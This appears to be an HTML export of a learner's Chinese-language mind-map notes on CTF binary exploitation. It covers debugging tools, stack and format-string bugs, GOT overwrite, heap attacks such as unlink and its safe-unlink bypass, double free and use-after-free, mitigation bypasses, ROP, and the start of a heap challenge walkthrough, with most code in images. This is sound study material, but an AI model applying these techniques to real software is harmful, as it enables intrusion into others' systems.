<html>
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="text/css" http-equiv="Content-Style-Type">
<title>CTF PWN4</title>
</head>
<body>
<h1 align="center" class="root">
<a name="3patpepe0uko2e2tqrf5ej2e77">CTF PWN4</a>
</h1>
<h2 class="topic">
<a name="38dad22sdaa8t9q8fchmo8ene1">b站视频教程作者的ppt学习</a>
</h2>
<h3 class="topic">
<a name="4irkljkqcoauej2ibd7a0fb21b">&nbsp;ppt资源地址https://www.cnblogs.com/junmoxiao/p/6185495.html</a>
</h3>
<h3 class="topic">
<a name="2r07m8vfsc785jjqir44nmg0va">&nbsp;常用工具</a>
</h3>
<h3 class="topic">
<a name="2fp5sdsr8spv2st7iqbi5qnkvs">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7e8c565357544e972d8938ef2064af34e490fcb04aa963d62586847653d309fa.png"></p>
<h3 class="topic">
<a name="1sh0eai40o5pjoh5l1i8ka1d34">&nbsp;&nbsp;&nbsp;ida常见功能</a>
</h3>
<h3 class="topic">
<a name="3o67ckblna7ggp2qtq7u6o2h1a">&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/e5feb56f5d1c7648503d7743c4bf176e30c333e17ffb9d25e35941c667b30255.png"></p>
<h3 class="topic">
<a name="586i6b9nlq8qsblti78kdqu06b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GDB基本用法</a>
</h3>
<h3 class="topic">
<a name="5u4vc807fu3bjot30002aqa8d1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/937e613be0e336553b73c0643403c3d270eb7294160f9c0171503ed83c475c2a.png"></p>
<h3 class="topic">
<a name="12jil1l1fpgnoq8tr6ajgoovl9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GDB插件：peda常见用法</a>
</h3>
<h3 class="topic">
<a name="1ficmj4oseluljah6t1o7lttci">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/8a814550cddb5106ac133c64c40f7ad18b7aec5470f866aef664cc64c7833ac2.png"></p>
<h3 class="topic">
<a name="708nrlo27qprnerc4fumdea86f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rp++基本用法</a>
</h3>
<h3 class="topic">
<a name="6a6d1charbd0sgamc37nn2btho">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/8e35c503b17e0fe5ba71b7d15c5c5c1798427494a222ef4aad234c2aed6c8fa6.png"></p>
<h3 class="topic">
<a name="2dlkhdl3ck6fmp2qrk4gldstmn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ROPgadget常用方法</a>
</h3>
<h3 class="topic">
<a name="069l7b2nkm31uhc1757sj3ifqh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/472hen7nvjkb65vu3geiruh40t.png"></p>
<h3 class="topic">
<a name="2a42pk7i3743390bpgd0oj3nhg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwntools</a>
</h3>
<h3 class="topic">
<a name="724qurpqu5jennnlnurgmqjur1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3i6scnj62a89bj4194gm5r2hta.png"></p>
<h3 class="topic">
<a name="33dfkfagvsoevtpaa47etej0ka">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2hfsei4p034pdspj0posr281d8.png"></p>
<h3 class="topic">
<a href="http://libcdb.com" name="25gtjs77gsh0ccv09ui199vbi6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libcdb.com</a>
</h3>
<h3 class="topic">
<a name="196abme8s9pjmsa6mre0rodbe3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要根据函数到模块首地址的距离，查找模块的版本</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3oa1888lh14gdn4rpon0mfsaog.png"></p>
<h3 class="topic">
<a name="1kib04bcbdeo99ajkvs8bk8uqh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc-database</a>
</h3>
<h3 class="topic">
<a name="0tm0ninq79musjkr4lel1pt57i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要根据函数到模块首地址的距离，查找模块的版本</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0vej62ojmmnodkooea7ph2c4ah.png"></p>
<h3 class="topic">
<a name="0baler8u1r96cmr40s5rbauhe2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;系统自带工具</a>
</h3>
<h3 class="topic">
<a name="4aj6p1i7o4tl0gk127g4lksg3k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2d6ohquiihql2aj6a6kvk3uefe.png"></p>
<h3 class="topic">
<a name="49rcu4jb3cnrgoa3kmce3k3ofk">&nbsp;分析程序的步骤</a>
</h3>
<h3 class="topic">
<a name="52slhd4intqc6lnga5cf08o4v5">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/164mfhso325ci8cffdq06gg4i3.png"></p>
<h3 class="topic">
<a name="7sm6h411aopqg4jou1vll6llgp">&nbsp;常见漏洞类型</a>
</h3>
<h3 class="topic">
<a name="6s7kifc3adt2emmgfvvpeleqtd">&nbsp;&nbsp;栈溢出</a>
</h3>
<h3 class="topic">
<a name="01jamf5bg3tf30jt421gqrfr0g">&nbsp;&nbsp;&nbsp;利用思路</a>
</h3>
<h3 class="topic">
<a name="0tcism6pbikn5qe727f6bcvvg4">&nbsp;&nbsp;&nbsp;&nbsp;覆盖返回地址</a>
</h3>
<h3 class="topic">
<a name="4d1okrn6nni53ofhs3ikqe0vs2">&nbsp;&nbsp;&nbsp;&nbsp;覆盖栈上的其他数据（函数指针或对象指针）</a>
</h3>
<h3 class="topic">
<a name="6emthcp0ie9sn3tknghnekec77">&nbsp;&nbsp;&nbsp;经验总结</a>
</h3>
<h3 class="topic">
<a name="1egnfnhh75h5fo69p746unaicb">&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/66ejh60nrsq4o4kp5pijeilf67.png"></p>
<h3 class="topic">
<a name="57ra35hih8676h2ek9pjmcukgp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;部分没有看懂</a>
</h3>
<h3 class="topic">
<a name="2ivke3un1e3rnng8j0f51e6v0d">&nbsp;&nbsp;格式化字符串漏洞</a>
</h3>
<h3 class="topic">
<a name="3egl7nlri4mg1hee17gkgs6l1u">&nbsp;&nbsp;&nbsp;%n用于向指定内存地址输出字符串长度&#13;
%nx可以用于输出一个长度为n的字符串</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/5kmg1uffhmfhm8mi43pgulhgck.png"></p>
<h3 class="topic">
<a name="1dj28ul5foceot4sqnohv69ael">&nbsp;&nbsp;&nbsp;GOT覆写</a>
</h3>
<h3 class="topic">
<a name="4vl483ub50bn2thr01bs1nkhli">&nbsp;&nbsp;&nbsp;&nbsp;如果程序是动态链接的，则程序使用动态链接库中的函数时，会从got表中获取该函数的地址，如果将got表中的地址修改为shellcode的首地址，则程序执行对应函数时，就可以执行shellcode</a>
</h3>
<h3 class="topic">
<a name="24ih4a1iushhjl3bqbmplds0fo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看got表的指令</a>
</h3>
<h3 class="topic">
<a name="5t22ehmcum81nsifht2l7ds9b2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;objdump -R 文件名</a>
</h3>
<h3 class="topic">
<a name="251h3hvfklebefhgknmk85akgb">&nbsp;&nbsp;&nbsp;&nbsp;可以使用格式化字符串漏洞提供的任意内存地址写的机会，修改got中的内容</a>
</h3>
<h3 class="topic">
<a name="19hue9ngqtbqjlm5ej63d6oit6">&nbsp;&nbsp;整数溢出</a>
</h3>
<h3 class="topic">
<a name="3n2p66ufsja3pfv4rmd7gtl9ep">&nbsp;&nbsp;&nbsp;常见情形</a>
</h3>
<h3 class="topic">
<a name="7lai3r9c8t4n3pvjdbp3khmh1o">&nbsp;&nbsp;&nbsp;&nbsp;无符号值存进了有符号变量</a>
</h3>
<h3 class="topic">
<a name="2lhti58h31g9kf2mi7k877bj7t">&nbsp;&nbsp;&nbsp;&nbsp;作比较时忽略了有符号数可以为负数</a>
</h3>
<h3 class="topic">
<a name="560tuvccpnot9joublh30botsq">&nbsp;&nbsp;&nbsp;&nbsp;如果被溢出的数据用于表示堆栈的大小，则可能造成堆溢出</a>
</h3>
<h3 class="topic">
<a name="0c5h11gq486nf2sent8g730591">&nbsp;&nbsp;堆漏洞</a>
</h3>
<h3 class="topic">
<a name="5jfjlegpreb52emn7634kdg7q5">&nbsp;&nbsp;&nbsp;堆相关知识</a>
</h3>
<h3 class="topic">
<a name="00blpbuqnu8qc6i93r6cf491np">&nbsp;&nbsp;&nbsp;&nbsp;fd：forward 指向前一个 -- bk：backward 指向后一个</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/098gu5vj128skflfj0pfmpl393.png"></p>
<h3 class="topic">
<a name="2702fjhah65p72k4om4mu4ihdk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4a09kcphmn3i7ck1ei41hd546m.png"></p>
<h3 class="topic">
<a name="1csh1evbr22se4p3dnpsm7s8bs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/49jhbem7idtd4529n7vjefg49p.png"></p>
<h3 class="topic">
<a name="5e35u2t8pii2d80vaqivphesgo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;单向链表中，根据chunk的大小，将相同大小的chunk连接为一个链表，chunk块中仅仅使用fd指针指向下一个chunk ，并且fastbin数组中每一个元素仅保存一个指针，指向下一个chunk</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2f61sgj017ons9iongv4pl4cbk.png"></p>
<h3 class="topic">
<a name="7u2rjenlf5co3cim6s6pfanehk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bins数组中每一个元素保存两个指针 fd指向下一个chunk，bk指向前一个chunk，在chunk中fd与bk也会发挥作用分别指向后一个和前一个chunk，同时，fd_nextsize和bk_nextsize会发挥作用，分别用于存放后一个和前一个chunk的大小</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4qs09e1v18364jum0ebd21gvc8.png"></p>
<h3 class="topic">
<a name="05laiuadmrjtavt52sfbu9thtt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当chunk被分配后，需要将对于chunk从链表中卸下，此时的操作即为unlink，与此对应，当堆块使用完毕被释放后，需要将对应的chunk重新链入链表，此时可以称为link &#13;
link和unlink均涉及fd bk指针操作，如果能通过堆溢出修改fd bk ，从而可以在unlink或link时，将指定数据写入指定内存 （还有比如chunk合并和chunk调整大小也可以达到该目的）</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0pds0j11npt8mvank2mtore44i.png"></p>
<h3 class="topic">
<a name="5aj7umsko6nn7g6c2muablni6t">&nbsp;&nbsp;&nbsp;&nbsp;堆块结构补充知识</a>
</h3>
<h3 class="topic">
<a name="1hmhfv185c214km0hr2cson1vt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;堆溢出结构原理分析：https://www.cnblogs.com/gm-201705/p/9901548.html</a>
</h3>
<h3 class="topic">
<a name="3g0h1upmj51sbqs449evicsnkc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/bme314/article/details/85473122</a>
</h3>
<h3 class="topic">
<a name="5d4hf0iu5p7fv98imsk2g0mno7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.freebuf.com/articles/system/91527.html</a>
</h3>
<h3 class="topic">
<a name="12cgbqmlak26pt7lldqgkfecoj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://wiki.x10sec.org/pwn/heap/heap_structure/#_2</a>
</h3>
<h3 class="topic">
<a name="6rn887lnahk884ort460gb0d75">&nbsp;&nbsp;&nbsp;漏洞类型</a>
</h3>
<h3 class="topic">
<a name="7hko746tjv5j3g0dps4cfhnbpl">&nbsp;&nbsp;&nbsp;&nbsp;堆溢出</a>
</h3>
<h3 class="topic">
<a name="2hrqdk50u9vr4b20ihtpg8f3u8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fastbin上的堆溢出</a>
</h3>
<h3 class="topic">
<a name="1risa0q2e8n5rrk1vv40r0kakl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;覆盖下一个chunk中的fd，将伪造的堆块加入单链表</a>
</h3>
<h3 class="topic">
<a name="38n3rkc27je08o5blp38clr23d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/43jlvednjvn6lh3bln3eip7a71.png"></p>
<h3 class="topic">
<a name="6o5q491r1gvvmedj6c0fkarom0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bins上的堆溢出</a>
</h3>
<h3 class="topic">
<a name="2b83os0ufrcf00cmuufne8l7h2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过溢出，伪造下一个chunk，将本chunk设置为free（即修改下一个chunk中的prev_inuse和prev_size）然后free当前chunk，可以造成堆块合并，从而触发unlink，或者直接free当前chunk，而不通过堆块合并触发unlink</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4adefg3ll7b72lheasccpfu5sa.png"></p>
<h3 class="topic">
<a name="46r4h4dgufebuj10ntnp8h91og">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即在两个已经分配的chunk1和chunk2之间伪造出一个free的chunk1.5，然后通过释放chunk2，通过chunk1.5和chunk2之间的堆块合并进行unlink，从而达到任意内存写的功能</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0ulsj9e4evr8d2i9snqmer7nmh.png"></p>
<h3 class="topic">
<a name="0t24noh27qnab3e65ot3u43d7i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;safeunlink对unlink的过程进行了检验，只有当&#13;
&#13;
当前chunk的后一个chunk的前一个chunk为当前chunk并且当前chunk的前一个chunk的后一个chunk为当前chunk是&#13;
&#13;
unlink才能发挥作用，绕过safeunlink需要特定的方法，即设计一个chunk，其fd和bk均指向自己，然后将该chunk进行unlink</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/36uefac2nhpd5fnht07mauu1ge.png"></p>
<h3 class="topic">
<a name="3d4vnsju4qmft5i8f94ndbvha7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是绕过safeunlink的方法，指针变量r中保存被unlink的chunk的地址，注意此时系统为64位，所以每个指针变量占8个字节，故fd距离chunk首地址偏移0x10字节，bk距离chunk首地址偏移0x18字节，此时将本chunk中的fd bk分别设置为 指针变量r的地址-0x18和0x10，当进行安全检查时，*（&amp;r-0x18+0x18）=r，则检查通过，在进行unlink的时候，将会修改指针变量r中的值，使其指向其他内存，从而为进一步漏洞利用做准备</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/79bmhjrkqbprt4egkfvb48qns1.png"></p>
<h3 class="topic">
<a name="671sgmq9hqtf4eh3tmstmp1650">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;堆溢出覆盖top chunk的大小</a>
</h3>
<h3 class="topic">
<a name="31g9bo78o1hnpdgtpr3il275d2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7fb9jk7353llksislh1ktdjgbt.png"></p>
<h3 class="topic">
<a name="1telltul592tnks756fjp1af89">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用基本思路：覆盖下一个chunk中的元数据</a>
</h3>
<h3 class="topic">
<a name="4uu5lld1adbhjfcsqt8t5bvphf">&nbsp;&nbsp;&nbsp;&nbsp;双重释放</a>
</h3>
<h3 class="topic">
<a name="10lqfrbp6eh12pr6v8nsdrqvik">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fastbin上的双重释放</a>
</h3>
<h3 class="topic">
<a name="00junrlkih7d8fr9lpiqkl70tj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基本思路是将伪造的堆加入fastbin中</a>
</h3>
<h3 class="topic">
<a name="30nbpbft7jr5u8mk7co7i9i35r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/1ndf82e5nmmgso19t4ejlovsi0.png"></p>
<h3 class="topic">
<a name="48nvh2oj100tgja2r2sr89inro">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bins上的双重释放</a>
</h3>
<h3 class="topic">
<a name="6mol8e0mm4am2b61pmj6h65ieh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;伪造堆，从而造成unlink的操作</a>
</h3>
<h3 class="topic">
<a name="6mplm0kl82shpolptj2ijmmpgn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/36g0kul29j0c6e23j7qfksnlhc.png"></p>
<h3 class="topic">
<a name="5u0aq737cv8g5cssvbsrpu66lf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要利用思路是将双重释放问题转化为释放重引用问题</a>
</h3>
<h3 class="topic">
<a name="74j2obhtev5q3ehht4lje0imp2">&nbsp;&nbsp;&nbsp;&nbsp;释放重引用</a>
</h3>
<h3 class="topic">
<a name="35fdteklslbfb1i9u6mu273bs1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/21qif2vk2j111bgnp5poetahs2.png"></p>
<h3 class="topic">
<a name="162vbbhm78dsddc9rip7mq2hgj">&nbsp;&nbsp;&nbsp;&nbsp;其他（这里的利用方法没看懂，需要结合视频）</a>
</h3>
<h3 class="topic">
<a name="7150v5dd2vttadfkoq7t8qr6vu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过栈溢出覆盖栈上的堆指针</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0h1b5sk6r89j0k8oldmc2bcplp.png"></p>
<h3 class="topic">
<a name="0tv452i703l6ie1s0sjigjaaks">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/377ur0cfkq18ifhri0klj4d6uo.png"></p>
<h3 class="topic">
<a name="613l9bfq7430nvv834b4ta2osc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0vhiojc0q03fblji8ipbofftk1.png"></p>
<h3 class="topic">
<a name="4eo2ai3narg5inf2livb6ivraa">&nbsp;&nbsp;&nbsp;fastbin相关的漏洞利用</a>
</h3>
<h3 class="topic">
<a name="35m5dmgk34lpp27li7ah3k0pv6">&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/5p0r1ho8o7hhnhpvnqtg7rk752.png"></p>
<h3 class="topic">
<a name="0l5un5nbvsrjmeae9g7h8jk312">&nbsp;常见防御技术与对抗方法</a>
</h3>
<h3 class="topic">
<a name="3ahe15bhfmjiodid9hast4tae9">&nbsp;&nbsp;常见防御技术</a>
</h3>
<h3 class="topic">
<a name="24sr58djop6r387vvnout8k1hm">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/1ul8mmsdb46bs2poubp25to8hb.png"></p>
<h3 class="topic">
<a name="5ohflke0d8i7tr83ima5ol8rd3">&nbsp;&nbsp;对抗方法</a>
</h3>
<h3 class="topic">
<a name="66j4p5jhfqa9eaa3et4n1f60jo">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3btbe1jf5v99l88sljhgk3qnnu.png"></p>
<h3 class="topic">
<a name="06aroo0blg9jdmmgeni6ioqq55">&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0cuqng46c68cbd9rs4pbbo2mfs.png"></p>
<h3 class="topic">
<a name="7nb9doa39d8q4bc3aqcduunk0h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3tlm5fulstai5tbqug90shmn7l.png"></p>
<h3 class="topic">
<a name="055vg5coe5cgq5dksvbib84nsh">&nbsp;32位程序和64位程序利用区别</a>
</h3>
<h3 class="topic">
<a name="2mpn1e6m1519j938grm16v4qcb">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4hnlo1q3o1h4u2lor6fn2fh1it.png"></p>
<h3 class="topic">
<a name="1q3tcqqn2n715f4a3dbhuu5uoj">&nbsp;&nbsp;&nbsp;32位函数通过栈传递参数&#13;
64位函数先用寄存器rdi rsi rdx rcx r8 r9传递参数，其他的通过栈传递参数</a>
</h3>
<h3 class="topic">
<a name="31aamfo8qcq3km5b9j8jb28uhg">&nbsp;ROP链构造方法（即一些典型的gadget的种类）</a>
</h3>
<h3 class="topic">
<a name="3gg6hqinlksdgqlr3fojcj09fd">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0spj2sso3eu5m7jmco4re5jtse.png"></p>
<h3 class="topic">
<a name="3aft1iaut8slclvf7b3so6ep4a">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/1qfsm6pnu70t6lgjjn8kkichjd.png"></p>
<h3 class="topic">
<a name="5s23a5ftmj9c86aijijkiltsoj">&nbsp;任意写内存的一些目标</a>
</h3>
<h3 class="topic">
<a name="12b213e4dkog85g13h6v6o00s1">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4mfn9hkh1399meu62tkedpkpln.png"></p>
<h3 class="topic">
<a name="3elmnm33bu5tb292tfa6dkfrea">&nbsp;参考文献</a>
</h3>
<h3 class="topic">
<a name="4ucv38geuh2r4c7okujpqb1l4q">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3eq8l193e3nkn3o87onakt79k0.png"></p>
<h2 class="topic">
<a name="3c0hb0j62fb0obl6bi34e9vvqr">ctf-pwn-扩展堆利用技巧</a>
</h2>
<h3 class="topic">
<a name="5suc4ii0vg3vv36p1g62vbjvq5">&nbsp;堆扩展技术</a>
</h3>
<h3 class="topic">
<a name="1pbehjij1885npt6lh9kvhq9qv">&nbsp;&nbsp;堆扩展：即通过修改chunk头中的size，扩大堆的范围，使其包含敏感数据，指针之类的</a>
</h3>
<h3 class="topic">
<a name="3ha72kp3atgbgfdp4rga356gbm">&nbsp;&nbsp;实例</a>
</h3>
<h3 class="topic">
<a name="5s4b1j3vheob6in925mr04sovr">&nbsp;&nbsp;&nbsp;做题流程</a>
</h3>
<h3 class="topic">
<a name="0nckt2vgtbkkgh6brrn5s71g72">&nbsp;&nbsp;&nbsp;&nbsp;checksec 文件名</a>
</h3>
<h3 class="topic">
<a name="0re42a55s72ijf8eosbthna7fp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看安全保护措施</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/184dtdmvmfcglkkv3j62kjgsc8.png"></p>
<h3 class="topic">
<a name="3urr5unh3ofpc4qb94969b8rre">&nbsp;&nbsp;&nbsp;&nbsp;运行一下程序，记录程序整体的工作流程</a>
</h3>
<h3 class="topic">
<a name="1shb45up5p4nurr1n2f7bhsppr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/10ub3ks0b7ur8bh6dqdsg4ee75.png"></p>
<h3 class="topic">
<a name="5j0s41tuuk77b3gcrj5sl3696a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0panapro09s4jpp13amjknjcqu.png"></p>
<h3 class="topic">
<a name="2coso5fv34ktblu45uh5kp8odt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6p4k2moqts44u8pr4qv7h06t1i.png"></p>
<h3 class="topic">
<a name="49opjbeunma5hophl6og2t2cmn">&nbsp;&nbsp;&nbsp;&nbsp;对漏洞情况进行猜测</a>
</h3>
<h3 class="topic">
<a name="6h5s5dpeahof9niv56d49tum57">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2hnvnsrj549t38s4l7ch3f9iah.png"></p>
<h3 class="topic">
<a name="70v57lvt2ejcovvqr2tledlqol">&nbsp;&nbsp;&nbsp;&nbsp;使用ida进行分析</a>
</h3>
<h3 class="topic">
<a name="3l8g2m6mi05o6if68kljjrt3o9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于create_heap函数</a>
</h3>
<h3 class="topic">
<a name="1indhqptimebeo651h62fvkhjp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/546i9t31b1n5ugc03ej62l6eak.png"></p>
<h3 class="topic">
<a name="2uj21lc2cqreicjsehjisi45vl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/5g15o0esg2kthg3elictjio4l5.png"></p>
<h3 class="topic">
<a name="3hgs6goun34mf00b0c8vp1s9u3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2pl0sosbbpll0pjjv8622mfq3h.png"></p>
<h3 class="topic">
<a name="32318qf4edlhcs6ljh82t3cqvh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于editor_heap函数</a>
</h3>
<h3 class="topic">
<a name="2k84s01nnakg9unblopbtetpqn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以在ida中 右键-》关闭casts，从而方便查看</a>
</h3>
<h3 class="topic">
<a name="55i373pdjhpascla0duus15k7v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/5rdvfhp30jsn7mend7c193av6l.png"></p>
<h3 class="topic">
<a name="2ke8kfa1j2fck2du14qat86b8v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6pdqhimimk3v05gb2ai8g3tnn9.png"></p>
<h3 class="topic">
<a name="4ds1a5p7v1ffrb6et4nt5vfmjm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/5rj2m8gn9t19p6a1iohnrgmnut.png"></p>
<h3 class="topic">
<a name="5e2g8g7akssq8m3eiaimt2caor">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分析函数</a>
</h3>
